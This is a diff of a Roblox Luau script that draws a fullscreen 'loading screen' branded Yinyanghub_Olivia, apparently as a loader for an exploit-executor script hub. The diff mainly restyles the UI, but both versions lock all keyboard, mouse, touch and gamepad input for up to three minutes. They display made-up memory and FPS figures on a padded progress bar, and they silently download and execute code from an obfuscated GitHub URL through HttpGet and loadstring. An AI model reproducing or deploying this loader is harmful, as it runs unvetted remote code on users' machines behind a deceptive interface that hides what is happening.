@@ -1,5 +1,5 @@
 -- Yinyanghub_Olivia | VORTEX_ENGINE_DELTA-3.7.980
--- Fullscreen Blocking Loading Screen (Luau / Roblox)
+-- Fullscreen Blocking Loading Screen (Modern UI + Smooth Tween Progress)
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -12,8 +12,9 @@ local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
 local TARGET_URL = "https://raw.githubusercontent.com/XASZD-NET/XKIUOOLRETGARFRXEC/refs/heads/main/Zigds/7376367/____%26__/All/Lua%2Cluau/Key-web-v4"
-local BASE_DURATION = 40.0 -- ประมาณ 40 วินาที เมื่อเครื่อง/เน็ตอยู่ในระดับปกติ
+local BASE_DURATION = 40.0
 local BAR_BLOCKS = 60
+local BLOCK_ACTION_NAME = "Yinyanghub_LockAllInputs"
 
 -- ล้าง UI เก่าหากรันซ้ำ
 local existing = playerGui:FindFirstChild("Yinyanghub_LoadingOverlay")
@@ -21,7 +22,7 @@ if existing then
 	existing:Destroy()
 end
 
--- สร้าง ScreenGui เต็มหน้าจอและบล็อกการกด
+-- สร้าง ScreenGui เต็มหน้าจอ
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "Yinyanghub_LoadingOverlay"
 screenGui.ResetOnSpawn = false
@@ -30,13 +31,13 @@ screenGui.DisplayOrder = 999999
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.Parent = playerGui
 
--- ปุ่มล่องหนเต็มจอเพื่อกินการคลิก/แตะทั้งหมด
+-- ปุ่มล่องหนเต็มจอเพื่อบล็อกการคลิก/แตะ
 local blockerButton = Instance.new("TextButton")
 blockerButton.Name = "InputBlocker"
 blockerButton.Size = UDim2.fromScale(1, 1)
 blockerButton.Position = UDim2.fromScale(0, 0)
-blockerButton.BackgroundColor3 = Color3.fromRGB(243, 232, 255) -- สีม่วงอ่อนมาก
-blockerButton.BackgroundTransparency = 0.78 -- โปร่งแสงสูง เห็นฉากหลังเกือบทั้งหมด
+blockerButton.BackgroundColor3 = Color3.fromRGB(18, 10, 32)
+blockerButton.BackgroundTransparency = 0.42
 blockerButton.BorderSizePixel = 0
 blockerButton.Text = ""
 blockerButton.AutoButtonColor = false
@@ -45,65 +46,154 @@ blockerButton.Modal = true
 blockerButton.ZIndex = 10
 blockerButton.Parent = screenGui
 
--- บล็อกปุ่มคีย์บอร์ด/คอนโทรลเลอร์ทั้งหมดระหว่างโหลด
-local BLOCK_ACTION_NAME = "Yinyanghub_LockAllInputs"
-ContextActionService:BindActionAtPriority(
-	BLOCK_ACTION_NAME,
-	function()
-		return Enum.ContextActionResult.Sink
-	end,
-	false,
-	Enum.ContextActionPriority.High.Value + 1000,
-	unpack(Enum.UserInputType:GetEnumItems())
-)
+-- บล็อกปุ่มผ่าน ContextActionService อย่างปลอดภัย
+pcall(function()
+	ContextActionService:BindActionAtPriority(
+		BLOCK_ACTION_NAME,
+		function()
+			return Enum.ContextActionResult.Sink
+		end,
+		false,
+		Enum.ContextActionPriority.High.Value + 1000,
+		Enum.UserInputType.Keyboard,
+		Enum.UserInputType.Gamepad1,
+		Enum.UserInputType.MouseButton1,
+		Enum.UserInputType.MouseButton2,
+		Enum.UserInputType.Touch
+	)
+end)
 
--- คอนเทนเนอร์ข้อความกึ่งกลางจอ
-local centerFrame = Instance.new("Frame")
-centerFrame.Name = "CenterInfo"
-centerFrame.AnchorPoint = Vector2.new(0.5, 0.5)
-centerFrame.Position = UDim2.fromScale(0.5, 0.5)
-centerFrame.Size = UDim2.new(0.85, 0, 0.45, 0)
-centerFrame.BackgroundTransparency = 1
-centerFrame.ZIndex = 20
-centerFrame.Parent = blockerButton
+-- การ์ดกลางจอสไตล์ทันสมัย
+local cardFrame = Instance.new("Frame")
+cardFrame.Name = "CenterCard"
+cardFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+cardFrame.Position = UDim2.fromScale(0.5, 0.5)
+cardFrame.Size = UDim2.new(0.88, 0, 0, 225)
+cardFrame.BackgroundColor3 = Color3.fromRGB(28, 16, 48)
+cardFrame.BackgroundTransparency = 0.14
+cardFrame.BorderSizePixel = 0
+cardFrame.ZIndex = 20
+cardFrame.Parent = blockerButton
+
+local cardSizeConstraint = Instance.new("UISizeConstraint")
+cardSizeConstraint.MaxSize = Vector2.new(540, 260)
+cardSizeConstraint.MinSize = Vector2.new(280, 195)
+cardSizeConstraint.Parent = cardFrame
+
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 18)
+cardCorner.Parent = cardFrame
+
+local cardStroke = Instance.new("UIStroke")
+cardStroke.Color = Color3.fromRGB(192, 132, 252)
+cardStroke.Thickness = 1.5
+cardStroke.Transparency = 0.35
+cardStroke.Parent = cardFrame
+
+local cardGradient = Instance.new("UIGradient")
+cardGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(46, 20, 82)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(26, 15, 46)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(58, 18, 78)),
+})
+cardGradient.Rotation = 35
+cardGradient.Parent = cardFrame
+
+local cardPadding = Instance.new("UIPadding")
+cardPadding.PaddingLeft = UDim.new(0, 18)
+cardPadding.PaddingRight = UDim.new(0, 18)
+cardPadding.PaddingTop = UDim.new(0, 16)
+cardPadding.PaddingBottom = UDim.new(0, 16)
+cardPadding.Parent = cardFrame
 
 local listLayout = Instance.new("UIListLayout")
 listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 listLayout.VerticalAlignment = Enum.VerticalAlignment.Center
 listLayout.SortOrder = Enum.SortOrder.LayoutOrder
 listLayout.Padding = UDim.new(0, 8)
-listLayout.Parent = centerFrame
+listLayout.Parent = cardFrame
 
-local function makeLabel(name, text, size, color, order, bold)
+local function makeLabel(name, text, size, color, order, bold, fontOverride)
 	local lbl = Instance.new("TextLabel")
 	lbl.Name = name
 	lbl.LayoutOrder = order
-	lbl.Size = UDim2.new(1, 0, 0, size + 8)
+	lbl.Size = UDim2.new(1, 0, 0, size + 6)
 	lbl.BackgroundTransparency = 1
 	lbl.Text = text
 	lbl.TextColor3 = color
 	lbl.TextSize = size
-	lbl.Font = bold and Enum.Font.GothamBold or Enum.Font.Code
+	lbl.Font = fontOverride or (bold and Enum.Font.GothamBold or Enum.Font.Code)
 	lbl.TextWrapped = true
 	lbl.ZIndex = 21
-	lbl.Parent = centerFrame
-
-	local stroke = Instance.new("UIStroke")
-	stroke.Color = Color3.fromRGB(255, 255, 255)
-	stroke.Thickness = 1
-	stroke.Transparency = 0.35
-	stroke.Parent = lbl
-
+	lbl.Parent = cardFrame
 	return lbl
 end
 
-makeLabel("TitleLabel", "Yinyanghub_Olivia", 24, Color3.fromRGB(59, 7, 100), 1, true)
-makeLabel("EngineLabel", "VORTEX_ENGINE_DELTA-3.7.980", 16, Color3.fromRGB(88, 28, 135), 2, true)
-local statsLabel = makeLabel("StatsLabel", "0mb/0fps", 16, Color3.fromRGB(76, 29, 149), 3, false)
-local barLabel = makeLabel("BarLabel", "[" .. string.rep(" ", BAR_BLOCKS) .. "]0%", 15, Color3.fromRGB(59, 7, 100), 4, false)
+local titleLabel = makeLabel("TitleLabel", "Yinyanghub_Olivia", 24, Color3.fromRGB(248, 250, 252), 1, true, Enum.Font.GothamBold)
+local engineLabel = makeLabel("EngineLabel", "VORTEX_ENGINE_DELTA-3.7.980", 14, Color3.fromRGB(216, 180, 254), 2, true, Enum.Font.Code)
+local statsLabel = makeLabel("StatsLabel", "0mb/0fps", 15, Color3.fromRGB(196, 181, 253), 3, false, Enum.Font.Code)
 
--- ประเมินความแรงของเครื่องและเครือข่าย
-local function getPerformanceMultiplier()
+-- หลอดโหลดกราฟิกแบบลื่นไหล (Tween)
+local barTrack = Instance.new("Frame")
+barTrack.Name = "ProgressTrack"
+barTrack.LayoutOrder = 4
+barTrack.Size = UDim2.new(1, 0, 0, 14)
+barTrack.BackgroundColor3 = Color3.fromRGB(15, 8, 28)
+barTrack.BackgroundTransparency = 0.2
+barTrack.BorderSizePixel = 0
+barTrack.ZIndex = 21
+barTrack.Parent = cardFrame
+
+local trackCorner = Instance.new("UICorner")
+trackCorner.CornerRadius = UDim.new(1, 0)
+trackCorner.Parent = barTrack
+
+local trackStroke = Instance.new("UIStroke")
+trackStroke.Color = Color3.fromRGB(139, 92, 246)
+trackStroke.Thickness = 1
+trackStroke.Transparency = 0.55
+trackStroke.Parent = barTrack
+
+local barFill = Instance.new("Frame")
+barFill.Name = "ProgressFill"
+barFill.Size = UDim2.fromScale(0, 1)
+barFill.BackgroundColor3 = Color3.fromRGB(168, 85, 247)
+barFill.BorderSizePixel = 0
+barFill.ZIndex = 22
+barFill.Parent = barTrack
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(1, 0)
+fillCorner.Parent = barFill
+
+local fillGradient = Instance.new("UIGradient")
+fillGradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(139, 92, 246)),
+	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(217, 70, 239)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 189, 248)),
+})
+fillGradient.Parent = barFill
+
+-- แถบตัวอักษร + เปอร์เซ็นต์
+local barLabel = makeLabel("BarLabel", "[" .. string.rep(" ", BAR_BLOCKS) .. "]0%", 12, Color3.fromRGB(226, 232, 240), 5, false, Enum.Font.Code)
+
+-- ดึงสคริปต์ล่วงหน้าแบบไม่บล็อก UI
+local fetchedFn = nil
+local fetchDone = false
+task.spawn(function()
+	local ok, result = pcall(function()
+		local source = game:HttpGet(TARGET_URL)
+		return loadstring(source)
+	end)
+	if ok and type(result) == "function" then
+		fetchedFn = result
+	else
+		warn("[Yinyanghub_Olivia] Failed to fetch/compile script:", result)
+	end
+	fetchDone = true
+end)
+
+local function getDurationMultiplier()
 	local pingMs = 120
 	pcall(function()
 		local netItem = Stats.Network.ServerStatsItem:FindFirstChild("Data Ping")
@@ -117,21 +207,17 @@ local function getPerformanceMultiplier()
 		memoryMb = tonumber(Stats:GetTotalMemoryUsageMb()) or 450
 	end)
 
-	local deviceBoost = 1.0
+	local deviceFactor = 1.0
 	if UserInputService.VREnabled then
-		deviceBoost = 0.85
+		deviceFactor = 1.15
 	elseif UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-		-- มือถือ/แท็บเล็ต: ปรับตามแรงกด/แรมคร่าวๆ
-		deviceBoost = memoryMb < 900 and 1.15 or 0.9
+		deviceFactor = memoryMb < 900 and 0.9 or 1.1
 	else
-		-- เดสก์ท็อป: แรมใช้งานน้อยและปิงต่ำจะเร็วขึ้น
-		deviceBoost = (pingMs < 80 and memoryMb < 1400) and 0.65 or 1.0
+		deviceFactor = (pingMs < 80 and memoryMb < 1400) and 0.7 or 1.0
 	end
 
-	local netFactor = math.clamp(pingMs / 100, 0.45, 2.2)
-	-- ยิ่งตัวคูณมาก ยิ่งใช้เวลานาน; ยิ่งน้อย ยิ่งโหลดเร็วขึ้น
-	local speedFactor = math.clamp((1.0 / netFactor) / deviceBoost, 0.25, 4.5)
-	return speedFactor, pingMs, memoryMb
+	local netFactor = math.clamp(pingMs / 100, 0.5, 2.0)
+	return math.clamp(netFactor * deviceFactor, 0.25, 4.0), pingMs, memoryMb
 end
 
 local function buildBlockBar(pct)
@@ -144,9 +230,81 @@ local frameCount = 0
 local fpsTimer = 0
 local currentFps = 24
 local currentMb = 457
-
+local lastPct = -1
+local activeBarTween = nil
 local finished = false
 local conn
+
+local function animateProgressBar(progress)
+	if activeBarTween then
+		activeBarTween:Cancel()
+	end
+	local info = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	activeBarTween = TweenService:Create(barFill, info, {
+		Size = UDim2.fromScale(math.clamp(progress, 0, 1), 1),
+	})
+	activeBarTween:Play()
+end
+
+local function unbindInputsOnly()
+	pcall(function()
+		ContextActionService:UnbindAction(BLOCK_ACTION_NAME)
+	end)
+end
+
+local function cleanupAndRun(fnToRun)
+	if conn then
+		conn:Disconnect()
+		conn = nil
+	end
+	if activeBarTween then
+		activeBarTween:Cancel()
+		activeBarTween = nil
+	end
+	unbindInputsOnly()
+
+	-- เอฟเฟกต์ Fade Out ก่อนปิดหน้าต่าง
+	local fadeInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+	local tweens = {}
+
+	table.insert(tweens, TweenService:Create(blockerButton, fadeInfo, { BackgroundTransparency = 1 }))
+	table.insert(tweens, TweenService:Create(cardFrame, fadeInfo, { BackgroundTransparency = 1 }))
+	table.insert(tweens, TweenService:Create(cardStroke, fadeInfo, { Transparency = 1 }))
+	table.insert(tweens, TweenService:Create(barTrack, fadeInfo, { BackgroundTransparency = 1 }))
+	table.insert(tweens, TweenService:Create(trackStroke, fadeInfo, { Transparency = 1 }))
+	table.insert(tweens, TweenService:Create(barFill, fadeInfo, { BackgroundTransparency = 1 }))
+
+	for _, lbl in ipairs({ titleLabel, engineLabel, statsLabel, barLabel }) do
+		table.insert(tweens, TweenService:Create(lbl, fadeInfo, { TextTransparency = 1 }))
+	end
+
+	for _, tw in ipairs(tweens) do
+		tw:Play()
+	end
+
+	task.delay(0.32, function()
+		if screenGui and screenGui.Parent then
+			screenGui:Destroy()
+		end
+		if fnToRun then
+			task.spawn(function()
+				local ok, err = pcall(fnToRun)
+				if not ok then
+					warn("[Yinyanghub_Olivia] Failed to execute script:", err)
+				end
+			end)
+		end
+	end)
+end
+
+screenGui.Destroying:Connect(function()
+	finished = true
+	if conn then
+		conn:Disconnect()
+		conn = nil
+	end
+	unbindInputsOnly()
+end)
 
 conn = RunService.RenderStepped:Connect(function(dt)
 	if finished then
@@ -162,40 +320,30 @@ conn = RunService.RenderStepped:Connect(function(dt)
 		fpsTimer = 0
 	end
 
-	local speedFactor, pingMs, totalMemMb = getPerformanceMultiplier()
-	local effectiveDuration = math.clamp(BASE_DURATION / speedFactor, 8, 180)
+	local durationMult, pingMs, totalMemMb = getDurationMultiplier()
+	local effectiveDuration = math.clamp(BASE_DURATION * durationMult, 8, 180)
 
 	elapsed += dt
 	local progress = math.clamp(elapsed / effectiveDuration, 0, 1)
 	local pct = math.floor(progress * 100)
 
-	-- คำนวณค่า mb ที่เปลี่ยนตามความแรงของเครื่อง/เน็ต และ FPS
 	local fpsScale = math.clamp(currentFps / 24, 0.25, 4.0)
 	local netScale = math.clamp(120 / math.max(pingMs, 15), 0.35, 3.0)
 	local memBase = math.clamp(totalMemMb * 0.45, 120, 1200)
 	currentMb = math.max(1, math.floor((memBase * fpsScale * netScale * (0.35 + 0.65 * progress)) + 0.5))
 
 	statsLabel.Text = string.format("%dmb/%dfps", currentMb, currentFps)
-	barLabel.Text = buildBlockBar(pct)
 
-	if progress >= 1 then
+	if pct ~= lastPct then
+		lastPct = pct
+		barLabel.Text = buildBlockBar(pct)
+		animateProgressBar(progress)
+	end
+
+	if progress >= 1 and fetchDone then
 		finished = true
-		conn:Disconnect()
-		ContextActionService:UnbindAction(BLOCK_ACTION_NAME)
-		screenGui:Destroy() -- ปิดหน้าต่างทันที ไม่มีหน้าต่างค้าง
-
-		-- รันสคริปต์เป้าหมายทันที
-		task.spawn(function()
-			local ok, err = pcall(function()
-				local source = game:HttpGet(TARGET_URL)
-				local fn = loadstring(source)
-				if fn then
-					fn()
-				end
-			end)
-			if not ok then
-				warn("[Yinyanghub_Olivia] Failed to execute script:", err)
-			end
-		end)
+		animateProgressBar(1)
+		local fnToRun = fetchedFn
+		cleanupAndRun(fnToRun)
 	end
 end)
